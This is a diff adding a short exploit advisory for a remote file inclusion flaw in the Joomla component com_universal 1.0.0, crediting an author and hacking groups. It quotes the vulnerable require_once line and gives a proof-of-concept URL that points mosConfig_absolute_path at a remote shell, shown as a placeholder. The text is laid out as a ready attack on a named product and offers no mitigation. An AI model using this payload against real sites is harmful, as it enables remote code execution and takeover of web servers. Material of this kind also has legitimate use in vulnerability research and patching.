@@ -1,0 +1,31 @@
+###########################################################
+	Joomla component com_universal <= Remote File Inclusion Vulnerability exploit
+###########################################################
+
+[+]Software:	Joomla component com_universal (UWCMS Universal Web CMS)
+[+]Version:	1.0.0
+[+]License:	http://www.gnu.org/copyleft/gpl.html GNU/GPL
+[+]Source:	http://uwcms.sourceforge.net
+[+]CWE ID :	98
+[+]Security Risk:	High
+[+]Remote Exploit:	Yes
+
+###########################################################
+[+]Author:	eidelweiss
+[+]Contact:	eidelweiss[at]cyberservices[dot]com
+[+]Thank`s:	sp3x (securityreason) - JosS (hack0wn) - r0073r & 0x1D (inj3ct0r)
+[+]Special:	[D]eal [C]yber - syabilla_putri (miss u) , psychotic_girl (dodol :P) , all my friends
+###########################################################
+
+-=[ VULN ]=-
+
+[-]	/includes/config/config.html.php
+
+	global $mosConfig_absolute_path;
+	require_once($mosConfig_absolute_path."/administrator/components/com_universal/includes/config/configuracion.php");
+
+-=[ P0C ]=-
+
+	http://127.0.0.1//administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path= [sh3ll inj3ct0r]
+
+###########################################################
